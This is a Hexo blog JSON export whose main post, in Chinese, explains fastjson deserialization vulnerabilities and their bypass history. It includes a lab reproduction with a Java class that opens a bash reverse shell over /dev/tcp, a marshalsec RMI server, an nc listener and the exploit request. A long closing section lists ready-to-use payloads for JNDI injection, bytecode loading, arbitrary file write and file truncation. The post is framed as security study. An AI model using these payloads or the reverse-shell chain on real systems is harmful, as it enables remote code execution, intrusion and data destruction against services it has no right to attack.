{"meta":{"title":"s1eep123のblog","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"about","date":"2022-08-31T16:16:30.000Z","updated":"2022-08-31T16:17:05.238Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"12345---title: 自我介绍标题layout: about---12312312312312"}],"posts":[{"title":"测试文章","slug":"fastjson漏洞原理","date":"2022-08-31T13:16:50.000Z","updated":"2022-08-31T16:23:20.856Z","comments":true,"path":"2022/08/31/fastjson漏洞原理/","link":"","permalink":"http://example.com/2022/08/31/fastjson%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/","excerpt":"","text":"fastjson 反序列化漏洞fastjson介绍 在前后端数据传输交互中,经常会遇到字符串(String)与json,XML等格式相互转换与解析，其中json以跨语言，跨前后端的优点在开发中被频繁使用，基本上可以说是标准的数据交换格式。fastjson 是一个java语言编写的高性能且功能完善的JSON库，它采用一种“假定有序快速匹配”的算法，把JSON Parse 的性能提升到了极致。它的接口简单易用，已经被广泛使用在缓存序列化，协议交互，Web输出等各种应用场景中。 FastJson是啊里巴巴的的开源库，用于对JSON格式的数据进行解析和打包。 漏洞介绍fastjson在序列化以及反序列化的过程中并没有使用Java自带的序列化机制，而是自定义了一套机制。其实，对于JSON框架来说，想要把一个Java对象转换成字符串，可以有两种选择：基于属性基于setter&#x2F;getter 12345678910class Apple implements Fruit &#123; private Big_Decimal price; //省略 setter/getter、toString等&#125;class iphone implements Fruit &#123; private Big_Decimal price; //省略 setter/getter、toString等&#125; 123toJSONString : &#123;&quot;fruit&quot;:&#123;&quot;price&quot;:0.5&#125;&#125;toJSONString : &#123;&quot;fruit&quot;:&#123;&quot;price&quot;:500&#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public class Fastjson &#123; public String name; public String age; public Fastjson() throws IOException &#123; this.name=&quot;james&quot;; this.age=&quot;18&quot;; &#125; public void setName(String test) &#123; System.out.println(&quot;name setter called&quot;); this.name = test; &#125; public String getName() &#123; System.out.println(&quot;name getter called&quot;); return this.name; &#125; public void setAge(String test) &#123; System.out.println(&quot;age setter called&quot;); this.age = test; &#125; public String getAge()&#123; System.out.println(&quot;age getter called&quot;); return this.age; &#125; @Override public String toString() &#123; return &quot;Fastjson&#123;&quot; + &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &quot;, age=&#x27;&quot; + age + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125; public static void main(String[] args) throws IOException &#123; //ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String o = JSON.toJSONString(new Fastjson()); System.out.println(o); //class转为json System.out.println(&quot;------------&quot;); Fastjson obj = (Fastjson) JSON.parse(&quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.fastjson.test.Fastjson\\&quot;,\\&quot;name\\&quot;:\\&quot;test name\\&quot;, \\&quot;age\\&quot;:\\&quot;test age\\&quot;&#125;&quot;); System.out.println(obj); //普通json对象转为object类 &#125;&#125;output://age getter calledname getter called&#123;&quot;age&quot;:&quot;18&quot;,&quot;name&quot;:&quot;james&quot;&#125;------------name setter calledage setter calledFastjson&#123;name=&#x27;test name&#x27;, age=&#x27;test age&#x27;&#125; 12345678为了解决上述问题：fastjson引入了AutoType，即在序列化的时候，把原始类型记录下来。&#123; &quot;fruit&quot;:&#123; &quot;@type&quot;:&quot;com.hollis.lab.fastjson.test.Apple&quot;, &quot;price&quot;:0.5 &#125;&#125; fastjson 在反序列化的时候会去找我们在 @type 中规定的类是哪个类，然后在反序列化的时候会自动调用这些 setter 与 getter 方法的调用，注意！并不是所有的 setter 和 getter 方法。 下面直接引用结论，Fastjson会对满足下列要求的setter&#x2F;getter方法进行调用： 1234567891011满足条件的setter：- 非静态函数- 返回类型为void或当前类- 参数个数为1个满足条件的getter：- 非静态方法- 无参数- **返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong** 我个人理解 fastjson 的利用攻击其实是蛮简单的，因为没有那么多复杂的链子，也不需要反射修改值，直接在 json 串里面赋值就好了。 漏洞原理由前面知道，Fastjson是自己实现的一套序列化和反序列化机制，不是用的Java原生的序列化和反序列化机制。无论是哪个版本，Fastjson反序列化漏洞的原理都是一样的，只不过不同版本是针对不同的黑名单或者利用不同利用链来进行绕过利用而已。 通过Fastjson反序列化漏洞，攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行。 那么如何才能够反序列化出恶意类呢？ 由前面demo知道，Fastjson使用parseObject()&#x2F;parse()进行反序列化的时候可以指定类型。如果指定的类型太大，包含太多子类，就有利用空间了。例如，如果指定类型为Object或JSONObject，则可以反序列化出来任意类。例如代码写Object o = JSON.parseObject(poc,Object.class)就可以反序列化出Object类或其任意子类，而Object又是任意类的父类，所以就可以反序列化出所有类。 如何才能触发反序列化得到的恶意类中的恶意函数呢? 由前面知道，在某些情况下进行反序列化时会将反序列化得到的类的构造函数、getter方法、setter方法执行一遍，如果这三种方法中存在危险操作，则可能导致反序列化漏洞的存在。换句话说，就是攻击者传入要进行反序列化的类中的构造函数、getter方法、setter方法中要存在漏洞才能触发。 我们到DefaultJSONParser.parseObject(Map object, Object fieldName)中看下，JSON中以@type形式传入的类的时候，调用deserializer.deserialize()处理该类，并去调用这个类的setter和getter方法： 1234567public final Object parseObject(final Map object, Object fieldName) &#123; ... // JSON.DEFAULT_TYPE_KEY即@type if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123; ... ObjectDeserializer deserializer = config.getDeserializer(clazz); return deserializer.deserialze(this, clazz, fieldName); 整个解析过程相当复杂，知道结论就ok了。 小结一下若反序列化指定类型的类如Student obj = JSON.parseObject(text, Student.class);，该类本身的构造函数、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞； 123456public void setName(String test) throws IOException &#123; System.out.println(&quot;name setter called&quot;); Runtime.getRuntime().exec(&quot;calc&quot;); this.name = test; &#125;//弹出calc 若反序列化未指定类型的类如Object obj = JSON.parseObject(text, Object.class);，该若该类的子类的构造方法、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞； PoC 写法一般的，Fastjson反序列化漏洞的PoC写法如下，@type指定了反序列化得到的类 12345&#123;&quot;@type&quot;:&quot;xxx.xxx.xxx&quot;,&quot;xxx&quot;:&quot;xxx&quot;,...&#125; 关键是要找出一个特殊的在目标环境中已存在的类，满足如下两个条件： 该类的构造函数、setter方法、getter方法中的某一个存在危险操作，比如造成命令执行； 可以控制该漏洞函数的变量（一般就是该类的属性）； 漏洞Demo由前面比较的案例知道，当反序列化指定的类型是Object.class，即代码为Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);时，反序列化得到的类的构造函数、所有属性的setter方法、properties私有属性的getter方法都会被调用，因此我们这里直接做最简单的修改，将Student类中会被调用的getter方法添加漏洞代码，这里修改getProperties()作为演示： 12345678910111213141516171819202122232425262728293031323334353637383940414243import java.util.Properties; public class Student &#123; private String name; private int age; private String address; private Properties properties; public Student() &#123; System.out.println(&quot;构造函数&quot;); &#125; public String getName() &#123; System.out.println(&quot;getName&quot;); return name; &#125; public void setName(String name) &#123; System.out.println(&quot;setName&quot;); this.name = name; &#125; public int getAge() &#123; System.out.println(&quot;getAge&quot;); return age; &#125; // public void setAge(int age) &#123; // System.out.println(&quot;setAge&quot;); // this.age = age; // &#125; public String getAddress() &#123; System.out.println(&quot;getAddress&quot;); return address; &#125; public Properties getProperties() throws Exception&#123; System.out.println(&quot;getProperties&quot;); Runtime.getRuntime().exec(&quot;calc&quot;); return properties; &#125; &#125; FastjsonEasyPoC.java 12345678910111213import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; public class FastjsonEasyPoC &#123; public static void main(String[] args)&#123; String jsonString =&quot;&#123;\\&quot;@type\\&quot;:\\&quot;Student\\&quot;,\\&quot;age\\&quot;:6,\\&quot;name\\&quot;:\\&quot;Drunkbaby\\&quot;,\\&quot;address\\&quot;:\\&quot;china\\&quot;,\\&quot;properties\\&quot;:&#123;&#125;&#125;&quot;; Object obj = JSON.parseObject(jsonString, Object.class); System.out.println(obj); System.out.println(obj.getClass().getName()); &#125; &#125; 很明显，前面的Demo中反序列化的类是一个Object类，该类是任意类的父类，其子类Student存在Fastjson反序列化漏洞，当@type指向Student类是反序列化就会触发漏洞。 对于另一种反序列化指定类的情景，是该指定类本身就存在漏洞，比如我们将上述Demo中反序列化那行代码改成直接反序列化得到Student类而非Object类，这样就是另一个触发也是最直接的触发场景： 漏洞攻防史 v1.2.24之前 @type自动加载类 v1.2.41之前， fastjson默认关闭了autotype支持，并且加入了checkAutotype （过滤@type里的值，黑白名 单过滤） 加载的过程中，fastjson有一段特殊的处理，那就是在具体加载类的时候会去掉className前后的L和后面的分号;，形如Lcom.lang.Thread; Lcom.sun.rowset.JdbcRowSetImpl; v1.2.42 在进行黑白名单检测的时候，fastjson先判断目标类的类名的前后是不是L和;，如果是的话，就截取掉前后的L和;再进行黑白名单的校验 LLcom.sun.rowset.JdbcRowSetImpl;; v1.2.43 fastjson这次在黑白名单判断之前，增加了一个是否以LL未开头的判断 在目标类前面添加[ v1.2.44版本中，fastjson的作者做了更加严格的要求，只要目标类以[开头或者以;结尾 v1.2.47 autoType不开启反而会被攻击。因为在fastjson中有一个全局缓存，在类加载的时候，如果autotype没开启，会先尝试从缓存中获取类，如果缓存中有，则直接返回。java.lang.Class类对应的deserializer为MiscCodec，反序列化时会取json串中的val值并加载这个val对应的类。如果fastjson cache为true，就会缓存这个val对应的class到全局缓存中 v1.2.68 利用异常进行攻击 OOM在fastjson中， 如果@type 指定的类为 Throwable 的子类，那对应的反序列化处理类就会使用到 ThrowableDeserializer而在ThrowableDeserializer#deserialze的方法中，当有一个字段的key也是 @type时，就会把这个 value 当做类名，然后进行一次 checkAutoType 检测。并且指定了expectClass为Throwable.class，但是在checkAutoType中，有这样一约定，那就是如果指定了expectClass ，那么也会通过校验。因为fastjson在反序列化的时候会尝试执行里面的getter方法，而Exception类中都有一个getMessage方法。只需要自定义一个异常，并且重写其getMessage就达到了攻击的目的。 漏洞分析fastjson1.2.24TemplatesImpl 漏洞利用链 1234561.构造一个 TemplatesImpl 类的反序列化字符串，其中 _bytecodes 是我们构造的恶意类的类字节码，这个类的父类是 AbstractTranslet，最终这个类会被加载并使用 newInstance() 实例化。2.在反序列化过程中，由于getter方法 getOutputProperties()，满足条件，将会被 fastjson 调用，而这个方法触发了整个漏洞利用流程：getOutputProperties() -&gt; newTransformer()-&gt; getTransletInstance() -&gt; defineTransletClasses() / EvilClass.newInstance(). payload 1234567&#123; &quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;, &quot;_bytecodes&quot;: [&quot;yv66vgAAADQA...CJAAk=&quot;], &quot;_name&quot;: &quot;su18&quot;, &quot;_tfactory&quot;: &#123;&#125;, &quot;_outputProperties&quot;: &#123;&#125;,&#125; 代码 12345678910111213141516public class Fastjson24poc &#123; public static void main(String[] args) &#123; //TemplatesImpl String byteCode = &quot;xxxxxxxxxxxxxxx&quot;; //构造TemplatesImpl的json数据，并将恶意类注入到json数据中 final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;; String payload = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;&quot; + NASTY_CLASS + &quot;\\&quot;,\\&quot;_bytecodes\\&quot;:[\\&quot;&quot;+byteCode+&quot;\\&quot;],&quot; + &quot;&#x27;_name&#x27;:&#x27;TempletaPoc&#x27;,&quot; + &quot;&#x27;_tfactory&#x27;:&#123;&#125;,&quot; + &quot;\\&quot;_outputProperties\\&quot;:&#123;&#125;&#125;\\n&quot;; System.out.println(payload); //反序列化 Object object = JSON.parseObject(payload, Feature.SupportNonPublicField); &#125;&#125; JdbcRowSetImpl payload 12345&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;:true&#125; fastjson1.2.25 payload 12345&#123; &quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;:true&#125; fastjson1.2.42 payload 12345&#123; &quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;:true&#125; fastjson1.2.43 payload 12345&#123; &quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[, &#123;&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;:true&#125; fastjson1.2.44 这个版本主要是修复上一个版本中使用 [ 绕过黑名单防护的问题 fastjson1.2.45 黑名单绕过 payload 123456&#123; &quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;, &quot;properties&quot;:&#123; &quot;data_source&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot; &#125;&#125; fastjson1.2.47 payload 1234567891011&#123; &quot;su18&quot;: &#123; &quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot; &#125;, &quot;su19&quot;: &#123; &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;: true &#125;&#125; fastjson版本探测DNSlog探测 以下POC出网，说明fastjson&lt;&#x3D;1.2.47 1&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;1247.xxxxx.dnslog.cn&quot;&#125;&#125; 以下这个POC出网，说明fastjson&gt;&#x3D;1.2.37 1&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://weffewfddd.dnslog.cn&quot;&#125;:&quot;aaa&quot;&#125; 以下这个POC出网，证明fastjson版本号1.1.16&lt;&#x3D;version&lt;&#x3D;1.2.24 1&#123;&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://xxxdsf.dnslog.cn:9999/POC&quot;,&quot;autoCommit&quot;:true&#125;&#125; 以下这几个POC，只能证明fastjson出网，无法判断fastjson是否存在反序列化漏洞，因为最新的打了补丁的fastjson也是能发起DNS请求的。 12345&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;sdffsd.dnslog.cn&quot;&#125;&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xxxxx.dnslog.cn&quot;&#125;&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;wefewffw.dnslog.cn&quot;&#125;&#125; 报错判断 提交一下两个POC，会抛出异常，有时候会显示出fastjson版本号来。 12345&#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;[&quot;test&quot;:1] 输入一些乱码字符，让web应用报错，有时候也会带出来版本号 vulhub漏洞复现fastjson1.2.24 docker启动环境 kali创建TouchFile文件用来反弹shell。 123456789101112131415import java.lang.Runtime;import java.lang.Process;public class TouchFile &#123;static &#123; try &#123; Runtime r = Runtime.getRuntime(); Process p = r.exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/192.168.5.143/4444 0&gt;&amp;1&quot;&#125;); p.waitFor(); &#125; catch (Exception e) &#123; // do nothing &#125; &#125;&#125; python起一个http服务 1python2 -m SimpleHTTPServer marshalsec启动RMI服务器 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.110.141:4433/#TouchFile&quot; 9988 kali上用NC开启端口监听 1nc -lvvp 4444 抓包改为POST包 1234567891011121314151617POST / HTTP/1.1Host: 192.168.110.141:8090User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36Accept: */*Accept-Encoding: gzip, deflateAccept-Language: enConnection: closeContent-Type: application/jsonContent-Length: 165&#123; &quot;b&quot;:&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi://192.168.110.141:9988/TouchFile&quot;, &quot;autoCommit&quot;:true &#125;&#125; 弹到shell fastjson1.2.27payload总结JdbcRowSetImpl 12345&#123; &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;: true&#125; TemplatesImpl 1234567&#123; &quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;, &quot;_bytecodes&quot;: [&quot;yv66vgA...k=&quot;], &#x27;_name&#x27;: &#x27;su18&#x27;, &#x27;_tfactory&#x27;: &#123;&#125;, &quot;_outputProperties&quot;: &#123;&#125;,&#125; JndiDataSourceFactory 123456&#123; &quot;@type&quot;: &quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;, &quot;properties&quot;: &#123; &quot;data_source&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot; &#125;&#125; SimpleJndiBeanFactory 1234567891011&#123; &quot;@type&quot;: &quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;, &quot;targetBeanName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;propertyPath&quot;: &quot;su18&quot;, &quot;beanFactory&quot;: &#123; &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;, &quot;shareableResources&quot;: [ &quot;ldap://127.0.0.1:23457/Command8&quot; ] &#125;&#125; DefaultBeanFactoryPointcutAdvisor 12345678910111213&#123; &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;, &quot;beanFactory&quot;: &#123; &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;, &quot;shareableResources&quot;: [ &quot;ldap://127.0.0.1:23457/Command8&quot; ] &#125;, &quot;adviceBeanName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125;,&#123; &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;&#125; WrapperConnectionPoolDataSource 1234&#123; &quot;@type&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;, &quot;userOverridesAsString&quot;: &quot;HexAsciiSerializedMap:aced000...6f;&quot; &#125; JndiRefForwardingDataSource 12345&#123; &quot;@type&quot;: &quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;, &quot;jndiName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;loginTimeout&quot;: 0 &#125; InetAddress 1234&#123; &quot;@type&quot;: &quot;java.net.InetAddress&quot;, &quot;val&quot;: &quot;http://dnslog.com&quot;&#125; Inet6Address 1234&#123; &quot;@type&quot;: &quot;java.net.Inet6Address&quot;, &quot;val&quot;: &quot;http://dnslog.com&quot;&#125; URL 1234&#123; &quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;: &quot;http://dnslog.com&quot;&#125; JSONObject 123456789&#123; &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;, &#123; &quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;: &quot;http://dnslog.com&quot; &#125;&#125;&quot;&quot;&#125; URLReader 12345678910&#123; &quot;poc&quot;: &#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONReader&quot;, &quot;reader&quot;: &#123; &quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;, &quot;url&quot;: &quot;http://127.0.0.1:9999&quot; &#125; &#125;&#125; AutoCloseable 任意文件写入 123456789101112&#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream&quot;, &quot;out&quot;: &#123; &quot;@type&quot;: &quot;java.io.FileOutputStream&quot;, &quot;file&quot;: &quot;/path/to/target&quot; &#125;, &quot;parameters&quot;: &#123; &quot;@type&quot;: &quot;org.apache.commons.compress.compressors.gzip.GzipParameters&quot;, &quot;filename&quot;: &quot;filecontent&quot; &#125;&#125; BasicDataSource 12345678&#123; &quot;@type&quot; : &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;, &quot;driverClassName&quot; : &quot;$$BCEL$$$l$8b$I$A$A$A$A...&quot;, &quot;driverClassLoader&quot; : &#123; &quot;@type&quot;:&quot;Lcom.sun.org.apache.bcel.internal.util.ClassLoader;&quot; &#125;&#125; JndiConverter 1234&#123; &quot;@type&quot;: &quot;org.apache.xbean.propertyeditor.JndiConverter&quot;, &quot;AsText&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; JtaTransactionConfig 1234567&#123; &quot;@type&quot;: &quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;, &quot;properties&quot;: &#123; &quot;@type&quot;: &quot;java.util.Properties&quot;, &quot;UserTransaction&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot; &#125;&#125; JndiObjectFactory 1234&#123; &quot;@type&quot;: &quot;org.apache.shiro.jndi.JndiObjectFactory&quot;, &quot;resourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; AnterosDBCPConfig 1234&#123; &quot;@type&quot;: &quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;, &quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; AnterosDBCPConfig2 1234&#123; &quot;@type&quot;: &quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;, &quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; CacheJndiTmLookup 1234&#123; &quot;@type&quot;: &quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;, &quot;jndiNames&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; AutoCloseable 清空指定文件 123456&#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;java.io.FileOutputStream&quot;, &quot;file&quot;:&quot;/tmp/nonexist&quot;, &quot;append&quot;:false&#125; AutoCloseable 清空指定文件 123456&#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;java.io.FileWriter&quot;, &quot;file&quot;:&quot;/tmp/nonexist&quot;, &quot;append&quot;:false&#125; AutoCloseable 任意文件写入 1234567891011121314151617181920212223242526272829&#123; &quot;stream&quot;: &#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;java.io.FileOutputStream&quot;, &quot;file&quot;:&quot;/tmp/nonexist&quot;, &quot;append&quot;:false &#125;, &quot;writer&quot;: &#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.apache.solr.common.util.FastOutputStream&quot;, &quot;tempBuffer&quot;:&quot;SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=&quot;, &quot;sink&quot;: &#123; &quot;$ref&quot;:&quot;$.stream&quot; &#125;, &quot;start&quot;:38 &#125;, &quot;close&quot;: &#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.iq80.snappy.SnappyOutputStream&quot;, &quot;out&quot;: &#123; &quot;$ref&quot;:&quot;$.writer&quot; &#125; &#125;&#125; BasicDataSource 12345678&#123; &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;, &quot;driverClassName&quot;: &quot;true&quot;, &quot;driverClassLoader&quot;: &#123; &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; &#125;, &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...o$V$A$A&quot; &#125; HikariConfig 1234&#123; &quot;@type&quot;: &quot;com.zaxxer.hikari.HikariConfig&quot;, &quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; HikariConfig 1234&#123; &quot;@type&quot;: &quot;com.zaxxer.hikari.HikariConfig&quot;, &quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; HikariConfig 1234&#123; &quot;@type&quot;: &quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;, &quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; HikariConfig 1234&#123; &quot;@type&quot;: &quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;, &quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; SessionBeanProvider 12345&#123; &quot;@type&quot;: &quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;, &quot;jndiName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;Object&quot;: &quot;su18&quot;&#125; JMSContentInterceptor 123456789&#123; &quot;@type&quot;: &quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;, &quot;parameters&quot;: &#123; &quot;@type&quot;: &quot;java.util.Hashtable&quot;, &quot;java.naming.factory.initial&quot;: &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;, &quot;topic-factory&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot; &#125;, &quot;namespace&quot;: &quot;&quot;&#125; ContextClassLoaderSwitcher 123456789&#123; &quot;@type&quot;: &quot;org.jboss.util.loading.ContextClassLoaderSwitcher&quot;, &quot;contextClassLoader&quot;: &#123; &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; &#125;, &quot;a&quot;: &#123; &quot;@type&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$...$A$A&quot; &#125;&#125; OracleManagedConnectionFactory 1234&#123; &quot;@type&quot;: &quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;, &quot;xaDataSourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; JNDIConfiguration 1234&#123; &quot;@type&quot;: &quot;org.apache.commons.configuration.JNDIConfiguration&quot;, &quot;prefix&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125;","categories":[{"name":"java安全","slug":"java安全","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"java安全","slug":"java安全","permalink":"http://example.com/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"测试文章","slug":"测试文章-1","date":"2022-08-31T13:16:50.000Z","updated":"2022-08-31T16:22:01.342Z","comments":true,"path":"2022/08/31/测试文章-1/","link":"","permalink":"http://example.com/2022/08/31/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0-1/","excerpt":"","text":"","categories":[{"name":"java安全","slug":"java安全","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"java安全","slug":"java安全","permalink":"http://example.com/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"测试文章","slug":"测试文章","date":"2022-08-31T13:16:45.000Z","updated":"2022-08-31T13:16:45.772Z","comments":true,"path":"2022/08/31/测试文章/","link":"","permalink":"http://example.com/2022/08/31/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2022-08-31T12:54:13.094Z","updated":"2022-08-31T12:54:13.094Z","comments":true,"path":"2022/08/31/hello-world/","link":"","permalink":"http://example.com/2022/08/31/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"java安全","slug":"java安全","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"java安全","slug":"java安全","permalink":"http://example.com/tags/java%E5%AE%89%E5%85%A8/"}]}